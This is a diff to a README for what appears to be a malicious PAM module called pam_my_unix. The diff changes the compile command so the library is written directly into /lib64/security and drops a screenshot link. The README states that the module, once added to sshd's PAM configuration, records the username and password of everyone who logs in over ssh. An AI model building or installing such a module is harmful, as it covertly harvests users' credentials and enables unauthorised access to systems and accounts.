@@ -19,12 +19,7 @@
 
 - compile
     ``` sh
-    cc main.c -o pam_my_unix.so -fPIC -m64 -shared -lpam
-    ```
-
-- move to the right directory
-    ``` sh
-    cp ./pam_my_unix.so /lib64/security/
+    cc main.c -o /lib64/security/pam_my_unix.so -fPIC -m64 -shared -lpam
     ```
 
 - edit sshd's pam config.
@@ -70,5 +65,4 @@
 
 - result
     When someone who is trying to auth via ssh, his username and password will log into a file.
-    ![result](https://raw.githubusercontent.com/LiGhT1EsS/pam_my_unix/master/doc/1.png)
 
